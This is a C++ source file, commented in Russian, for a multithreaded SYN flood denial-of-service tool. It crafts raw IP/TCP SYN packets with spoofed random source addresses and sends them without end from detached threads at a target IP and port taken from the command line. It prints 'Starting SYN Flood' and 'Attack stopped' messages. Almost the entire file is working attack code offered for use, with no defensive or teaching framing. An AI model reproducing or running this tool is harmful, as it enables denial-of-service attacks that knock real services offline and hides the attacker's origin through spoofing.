#include <iostream>
#include <cstdlib>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <thread>
#include <csignal>
#include <atomic>

// Глобальная переменная для контроля выполнения
std::atomic<bool> running(true);

// Обработчик сигнала для graceful shutdown
void signal_handler(int signum) {
    running = false;
}

// Структура для псевдослучайного заголовка
struct pseudohdr {
    uint32_t saddr;
    uint32_t daddr;
    uint8_t zero;
    uint8_t protocol;
    uint16_t length;
};

// Функция расчета контрольной суммы
unsigned short checksum(void *addr, int len) {
    int sum = 0;
    unsigned short *buf = (unsigned short*)addr;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char*)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// Основная функция атаки
void send_syn(const char* target_ip, int target_port, int count, int delay) {
    // Создание raw socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        return;
    }

    // Включение опции IP_HDRINCL
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        close(sock);
        return;
    }

    // Подготовка адреса назначения
    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(target_port);
    dest_addr.sin_addr.s_addr = inet_addr(target_ip);

    // Буфер для пакета
    char packet[4096];
    memset(packet, 0, sizeof(packet));

    // IP заголовок
    struct iphdr *ip = (struct iphdr*)packet;
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip->id = htons(getpid());
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->daddr = dest_addr.sin_addr.s_addr;

    // TCP заголовок
    struct tcphdr *tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
    tcp->source = htons(rand() % 65535);
    tcp->dest = htons(target_port);
    tcp->seq = rand();
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->window = htons(65535);
    
    // Псевдозаголовок для контрольной суммы
    struct pseudohdr psh;
    psh.saddr = ip->saddr;
    psh.daddr = ip->daddr;
    psh.zero = 0;
    psh.protocol = IPPROTO_TCP;
    psh.length = htons(sizeof(struct tcphdr));
    
    char pseudo_packet[sizeof(psh) + sizeof(struct tcphdr)];
    memcpy(pseudo_packet, &psh, sizeof(psh));
    memcpy(pseudo_packet + sizeof(psh), tcp, sizeof(struct tcphdr));
    tcp->check = checksum(pseudo_packet, sizeof(pseudo_packet));

    // Основной цикл отправки
    while (running && count--) {
        // Генерация случайных значений
        ip->saddr = rand();
        ip->id = htons(rand() % 65535);
        tcp->source = htons(rand() % 65535);
        tcp->seq = rand();
        
        // Пересчет контрольной суммы IP
        ip->check = 0;
        ip->check = checksum(ip, sizeof(struct iphdr));
        
        // Пересчет контрольной суммы TCP
        psh.saddr = ip->saddr;
        memcpy(pseudo_packet, &psh, sizeof(psh));
        memcpy(pseudo_packet + sizeof(psh), tcp, sizeof(struct tcphdr));
        tcp->check = 0;
        tcp->check = checksum(pseudo_packet, sizeof(pseudo_packet));

        // Отправка пакета
        if (sendto(sock, packet, ntohs(ip->tot_len), 0, 
                  (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("sendto");
        }
        
        // Задержка между пакетами
        if (delay > 0) {
            usleep(delay);
        }
    }
    
    close(sock);
}

int main(int argc, char *argv[]) {
    // Обработка сигналов
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    // Проверка аргументов
    if (argc < 4) {
        std::cerr << "Usage: " << argv[0] << " <IP> <PORT> <THREADS> [PACKETS_PER_SEC]\n";
        return 1;
    }

    const char* ip = argv[1];
    int port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    int pps = (argc > 4) ? atoi(argv[4]) : 1000;
    int delay = (pps > 0) ? 1000000 / pps : 0;

    std::cout << "[+] Starting SYN Flood on " << ip << ":" << port 
              << " with " << threads << " threads (" << pps << " pps)\n";

    // Запуск потоков
    for (int i = 0; i < threads; i++) {
        std::thread(send_syn, ip, port, -1, delay).detach();
    }

    // Ожидание завершения
    std::cout << "[!] Press Ctrl+C to stop...\n";
    while (running) {
        sleep(1);
    }

    std::cout << "\n[+] Attack stopped\n";
    return 0;
}